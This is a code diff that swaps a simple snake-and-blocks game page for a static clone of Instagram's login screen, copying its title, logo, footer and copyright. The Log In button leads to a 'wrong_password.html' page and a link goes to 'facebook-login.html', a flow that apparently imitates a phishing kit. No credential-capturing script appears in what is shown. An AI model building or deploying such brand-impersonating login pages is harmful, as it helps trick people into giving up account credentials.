@@ -1,355 +1,90 @@
+<!-- This is instagram login page -->
+
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
+
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ADAM SYSTEM | FINAL V5</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://unpkg.com/lucide@latest"></script>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login . Instagram</title>
+    <link rel="stylesheet" href="loginstyle.css">
+    <link rel="shortcut icon" href="/Instagram_logo_2016.svg.webp">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Noto+Sans+Arabic:wght@700&display=swap');
-        
-        body { 
-            background: #000; 
-            color: white; 
-            touch-action: none; 
-            overscroll-behavior: none; 
-            overflow: hidden; 
-            font-family: 'Noto Sans Arabic', sans-serif; 
-        }
-        .neon-border { 
-            border: 1px solid #00f2ff; 
-            box-shadow: 0 0 15px rgba(0, 242, 255, 0.3); 
-        }
-        .ctrl-btn { 
-            width: 70px; 
-            height: 70px; 
-            background: rgba(255,255,255,0.05); 
-            border: 1px solid rgba(255,255,255,0.15); 
-            border-radius: 20px; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center;
-            font-size: 28px;
-        }
-        .ctrl-btn:active { 
-            background: #00f2ff; 
-            color: #000; 
-            transform: scale(0.85); 
-            transition: all 0.1s;
-        }
-        .piece-opt { 
-            border: 2px solid transparent; 
-            transition: all 0.2s; 
-            background: rgba(255,255,255,0.03);
-        }
-        .selected-p { 
-            border-color: #00f2ff; 
-            background: rgba(0, 242, 255, 0.2); 
-            box-shadow: 0 0 15px rgba(0, 242, 255, 0.5);
-        }
-        .dedication { 
-            font-family: 'Orbitron', sans-serif; 
-            color: #ff007a; 
-            text-shadow: 0 0 8px #ff007a; 
+        img {
+            vertical-align: text-top;
         }
     </style>
 </head>
+
 <body>
+    <div class="container">
+        <div class="box">
+            <div class="heading"></div>
+            <form class="login-form">
+                <div class="field">
+                    <input id="username" type="name" placeholder="Phone number, username, or email" />
+                    <label for="username">Phone number, username, or email</label>
+                </div>
+                <div class="field">
+                    <input id="password" type="password" placeholder="password" />
+                    <label for="password">Password</label>
+                </div>
+                <button class="login-button" title="login"><a href="wrong_password.html">Log In</button></a>
+                <div class="separator">
+                    <div class="line"></div>
+                    <p>OR</p>
+                    <div class="line"></div>
+                </div>
 
-    <div id="menu" class="h-screen flex flex-col items-center justify-center p-8">
-        <div class="text-center mb-12">
-            <h1 class="text-5xl font-black italic text-cyan-400 mb-2">ADAM<span class="text-white">SYSTEM</span></h1>
-            <p class="dedication text-[10px] animate-pulse">HAD SITE LIK A MARWAA ❤️</p>
+                <div class="other">
+                    <button class="fb-login-btn" type="button">
+                        <i class="fa fa-facebook-official fb-icon"></i>
+                        <span class=""><img src="https://icons.iconarchive.com/icons/paomedia/small-n-flat/1024/social-facebook-icon.png"height="15" width="15"><a href="facebook-login.html">&nbsp;Log in with Facebook</a>
+                        </span>
+                    </button>
+                    <a class="forgot-password" href="/forget.html">Forgot password?</a>
+                </div>
+            </form>
         </div>
-        
-        <div class="space-y-6 w-full max-w-xs">
-            <button onclick="openGame('snake')" class="w-full py-6 bg-slate-900 neon-border rounded-2xl flex items-center justify-around hover:scale-105 transition-transform">
-                <i data-lucide="snake" class="text-cyan-400 w-8 h-8"></i>
-                <span class="font-bold text-lg">NEON SNAKE</span>
-            </button>
-            <button onclick="openGame('blocks')" class="w-full py-6 bg-slate-900 neon-border rounded-2xl flex items-center justify-around hover:scale-105 transition-transform">
-                <i data-lucide="layout-grid" class="text-pink-500 w-8 h-8"></i>
-                <span class="font-bold text-lg">BLOCK MASTER</span>
-            </button>
-        </div>
-        <div class="mt-20 opacity-20 text-[8px] font-mono italic">EDITED BY ADAM ABABOU</div>
-    </div>
-
-    <!-- Snake Game -->
-    <div id="snake-view" class="fixed inset-0 bg-black hidden flex-col items-center pt-12">
-        <div class="w-full max-w-[320px] flex justify-between px-4 mb-4">
-            <span class="text-cyan-400 font-black text-lg">SCORE: <span id="s-score">0</span></span>
-            <button onclick="goHome()" class="opacity-60 hover:opacity-100"><i data-lucide="home" class="w-6 h-6"></i></button>
-        </div>
-        <canvas id="s-canvas" width="400" height="400" class="w-80 h-80 neon-border rounded-2xl bg-black"></canvas>
-        
-        <div class="mt-10 grid grid-cols-3 gap-3">
-            <div></div>
-            <button onclick="chDir(0,-1)" class="ctrl-btn"><i data-lucide="chevron-up"></i></button>
-            <div></div>
-            
-            <button onclick="chDir(-1,0)" class="ctrl-btn"><i data-lucide="chevron-left"></i></button>
-            <button onclick="initS()" class="w-16 h-16 bg-red-600/20 text-red-500 rounded-full border border-red-600/30 text-xs font-bold active:scale-90">RESET</button>
-            <button onclick="chDir(1,0)" class="ctrl-btn"><i data-lucide="chevron-right"></i></button>
-            
-            <div></div>
-            <button onclick="chDir(0,1)" class="ctrl-btn"><i data-lucide="chevron-down"></i></button>
-            <div></div>
+        <div class="box">
+            <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
         </div>
     </div>
-
-    <!-- Blocks Game -->
-    <div id="blocks-view" class="fixed inset-0 bg-black hidden flex flex-col items-center pt-12">
-        <div class="w-full max-w-[320px] flex justify-between px-4 mb-4">
-            <span class="text-pink-500 font-black text-lg">SCORE: <span id="b-score">0</span></span>
-            <button onclick="goHome()" class="opacity-60 hover:opacity-100"><i data-lucide="home" class="w-6 h-6"></i></button>
-        </div>
-        <div id="b-grid" class="grid grid-cols-8 gap-1 p-3 bg-slate-900 neon-border rounded-2xl w-80 h-80"></div>
-        
-        <div id="b-options" class="mt-8 flex gap-4 h-28 justify-center items-center"></div>
-        
-        <button onclick="genB()" class="mt-6 text-sm font-bold text-cyan-400 border border-cyan-400/30 px-8 py-3 rounded-full hover:bg-cyan-400/10 transition-colors">
-            تحديث الأشكال
-        </button>
+    <br>
+    <div class="get">
+    Get the app.
     </div>
+    <br>
+    <div class="apps">
+        <a href="/forget.html">
+        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" height="40"
+            width="134"></a>&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;<a href="/forget.html"> 
+        <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" height="40" width="134"></a>
+        </div>
+        <br>
+        <div class="footer">
+    <footer>
+            Meta
+            About
+            Blog
+            Jobs
+            Help
+            API
+            Privacy
+            Terms
+            Top Accounts
+            Hashtags
+            Locations
+            Instagram Lite
+            Contact Uploading & Non-Users
+    </footer>
+</div>
+<div class="copyright">
+    <br>    
+    English © 2022 Instagram from Meta
+</div>
 
-    <script>
-        lucide.createIcons();
-
-        function openGame(g) { 
-            document.getElementById('menu').classList.add('hidden'); 
-            document.getElementById(g + '-view').classList.remove('hidden');
-            if (g === 'snake') initS();
-            else initB();
-        }
-
-        function goHome() { 
-            document.querySelectorAll('div[id$="-view"]').forEach(v => v.classList.add('hidden'));
-            document.getElementById('menu').classList.remove('hidden');
-            if (typeof sLoop !== 'undefined') clearInterval(sLoop);
-        }
-
-        // ==================== SNAKE LOGIC ====================
-        let snk, fd, dir, sc, sLoop, sCtx;
-        
-        function initS() {
-            clearInterval(sLoop);
-            snk = [{x: 10, y: 10}];
-            fd = {x: 15, y: 15};
-            dir = {x: 1, y: 0};
-            sc = 0;
-            document.getElementById('s-score').innerText = sc;
-            
-            const canvas = document.getElementById('s-canvas');
-            sCtx = canvas.getContext('2d');
-            
-            sLoop = setInterval(drawS, 110); // تحسين السرعة قليلاً
-        }
-
-        function chDir(x, y) {
-            // منع الدوران 180 درجة مباشرة
-            if (x === -dir.x && y === -dir.y) return;
-            dir = {x, y};
-        }
-
-        function drawS() {
-            let head = { 
-                x: snk[0].x + dir.x, 
-                y: snk[0].y + dir.y 
-            };
-
-            // Wrap around (دوران من الحواف)
-            if (head.x < 0) head.x = 19;
-            if (head.x > 19) head.x = 0;
-            if (head.y < 0) head.y = 19;
-            if (head.y > 19) head.y = 0;
-
-            // الاصطدام بالنفس
-            if (snk.some(segment => segment.x === head.x && segment.y === head.y)) {
-                initS();
-                return;
-            }
-
-            snk.unshift(head);
-
-            // أكل الطعام
-            if (head.x === fd.x && head.y === fd.y) {
-                sc += 10;
-                document.getElementById('s-score').innerText = sc;
-                fd = {
-                    x: Math.floor(Math.random() * 20),
-                    y: Math.floor(Math.random() * 20)
-                };
-            } else {
-                snk.pop();
-            }
-
-            // رسم اللعبة
-            sCtx.fillStyle = "#000";
-            sCtx.fillRect(0, 0, 400, 400);
-
-            // الثعبان
-            sCtx.fillStyle = "#00f2ff";
-            snk.forEach(s => {
-                sCtx.fillRect(s.x * 20, s.y * 20, 18, 18);
-            });
-
-            // الطعام
-            sCtx.fillStyle = "#ff007a";
-            sCtx.fillRect(fd.x * 20, fd.y * 20, 18, 18);
-        }
-
-        // ==================== BLOCKS LOGIC ====================
-        let board = Array(64).fill(0);
-        let bSc = 0;
-        let sel = null;
-
-        // أشكال محسنة ومتسقة (كلها 3x3 max)
-        const SHAPES = [
-            [[1,1],[1,1]],           // مربع 2x2
-            [[1,1,1]],               // خط أفقي
-            [[1],[1],[1]],           // خط رأسي
-            [[1,1],[0,1]],           // L صغير
-            [[1,0],[1,1]],           // L معكوس
-            [[1,1,1],[0,1,0]],       // T
-            [[1,1],[1,0]],           // L آخر
-            [[1,0,0],[1,1,1]]        // J
-        ];
-
-        function initB() {
-            board.fill(0);
-            bSc = 0;
-            document.getElementById('b-score').innerText = bSc;
-            renderG();
-            genB();
-        }
-
-        function renderG() {
-            const grid = document.getElementById('b-grid');
-            grid.innerHTML = '';
-            board.forEach((value, index) => {
-                const cell = document.createElement('div');
-                cell.className = `w-full h-full rounded transition-all ${value 
-                    ? 'bg-cyan-400 shadow-[0_0_8px_#00f2ff]' 
-                    : 'bg-slate-800 hover:bg-slate-700'}`;
-                cell.onclick = () => placeB(index);
-                grid.appendChild(cell);
-            });
-        }
-
-        function genB() {
-            sel = null;
-            const container = document.getElementById('b-options');
-            container.innerHTML = '';
-
-            for (let i = 0; i < 3; i++) {
-                const shape = SHAPES[Math.floor(Math.random() * SHAPES.length)];
-                const pieceDiv = document.createElement('div');
-                pieceDiv.className = "grid grid-cols-3 gap-1 p-3 piece-opt rounded-xl cursor-pointer";
-                
-                pieceDiv.onclick = () => {
-                    document.querySelectorAll('.piece-opt').forEach(p => p.classList.remove('selected-p'));
-                    pieceDiv.classList.add('selected-p');
-                    sel = shape;
-                };
-
-                // رسم الشكل (دعم أشكال مختلفة الأحجام)
-                for (let r = 0; r < 3; r++) {
-                    for (let c = 0; c < 3; c++) {
-                        const dot = document.createElement('div');
-                        const isFilled = shape[r] && shape[r][c] === 1;
-                        dot.className = `w-4 h-4 rounded-sm transition-all ${isFilled ? 'bg-pink-500 shadow-sm' : 'bg-transparent'}`;
-                        pieceDiv.appendChild(dot);
-                    }
-                }
-                container.appendChild(pieceDiv);
-            }
-        }
-
-        function placeB(index) {
-            if (!sel) return;
-
-            const row = Math.floor(index / 8);
-            const col = index % 8;
-            let canPlace = true;
-
-            // التحقق من إمكانية الوضع
-            for (let ri = 0; ri < sel.length; ri++) {
-                for (let ci = 0; ci < (sel[ri] ? sel[ri].length : 0); ci++) {
-                    if (sel[ri][ci] === 1) {
-                        const newRow = row + ri;
-                        const newCol = col + ci;
-                        if (newRow > 7 || newCol > 7 || board[newRow * 8 + newCol] === 1) {
-                            canPlace = false;
-                            break;
-                        }
-                    }
-                }
-                if (!canPlace) break;
-            }
-
-            if (canPlace) {
-                // وضع القطعة
-                for (let ri = 0; ri < sel.length; ri++) {
-                    for (let ci = 0; ci < (sel[ri] ? sel[ri].length : 0); ci++) {
-                        if (sel[ri][ci] === 1) {
-                            board[(row + ri) * 8 + (col + ci)] = 1;
-                        }
-                    }
-                }
-
-                bSc += 20;
-                checkB();
-                renderG();
-                
-                // إخفاء القطعة المستخدمة
-                const selectedPiece = document.querySelector('.selected-p');
-                if (selectedPiece) selectedPiece.style.opacity = "0.15";
-
-                // إذا انتهت كل القطع → توليد جديدة
-                const allUsed = Array.from(document.getElementById('b-options').children)
-                                    .every(p => p.style.opacity === "0.15");
-                if (allUsed) genB();
-
-                document.getElementById('b-score').innerText = bSc;
-            }
-        }
-
-        function checkB() {
-            // التحقق من الصفوف
-            for (let i = 0; i < 8; i++) {
-                let isFullRow = true;
-                for (let j = 0; j < 8; j++) {
-                    if (board[i * 8 + j] === 0) {
-                        isFullRow = false;
-                        break;
-                    }
-                }
-                if (isFullRow) {
-                    for (let j = 0; j < 8; j++) board[i * 8 + j] = 0;
-                    bSc += 100;
-                }
-            }
-
-            // التحقق من الأعمدة
-            for (let j = 0; j < 8; j++) {
-                let isFullCol = true;
-                for (let i = 0; i < 8; i++) {
-                    if (board[i * 8 + j] === 0) {
-                        isFullCol = false;
-                        break;
-                    }
-                }
-                if (isFullCol) {
-                    for (let i = 0; i < 8; i++) board[i * 8 + j] = 0;
-                    bSc += 100;
-                }
-            }
-        }
-
-        // بدء اللعبة عند تحميل الصفحة (اختياري)
-        // window.onload = () => { lucide.createIcons(); };
-    </script>
 </body>
+
 </html>
